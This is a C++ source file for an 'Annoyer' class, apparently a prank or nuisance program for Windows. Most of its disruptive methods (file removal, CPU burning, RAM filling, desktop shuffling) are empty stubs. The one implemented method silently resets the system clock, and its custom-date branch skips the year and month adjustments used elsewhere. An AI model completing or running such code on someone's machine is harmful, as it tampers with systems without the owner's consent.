#include "Annoyer.h"
#include "Main.h"
#include "Utils.h"

Annoyer::Annoyer()
{
	time_t now = time(NULL);
	localtime_s(&born_date, &now);
}

int Annoyer::j_cli_with_msg(char* msg) {
	return -1;
}

int Annoyer::j_desktop_shuffle() {
	return -1;
}


int Annoyer::j_time_date_mod(tm* t, bool mod_date) {
	SYSTEMTIME st;
	time_t now = time(NULL);
	struct tm now_struct;

	localtime_s(&now_struct, &now);

	st.wHour = t->tm_hour;
	st.wMinute = t->tm_min;
	st.wSecond = t->tm_sec;
	st.wMilliseconds = 000;

	if (mod_date) {
		st.wYear = t->tm_year;
		st.wMonth = t->tm_mon;
		st.wDay = t->tm_mday;
	}
	else { // Set current date
		st.wYear = now_struct.tm_year + 1900;
		st.wMonth = now_struct.tm_mon + 1;
		st.wDay = now_struct.tm_mday;
	}

	if (SetSystemTime(&st)) {
		return 0;
	}
	else {
		return -1;
	}

	return 0;
}

int Annoyer::j_files_creation(int max_files) {
	return -1;
}

int Annoyer::j_files_removal() {
	return -1;
}

int Annoyer::j_cpu_burn(int millis) {
	return -1;
}

int Annoyer::j_ram_fill(int millis, int max_bytes) {
	return -1;
}

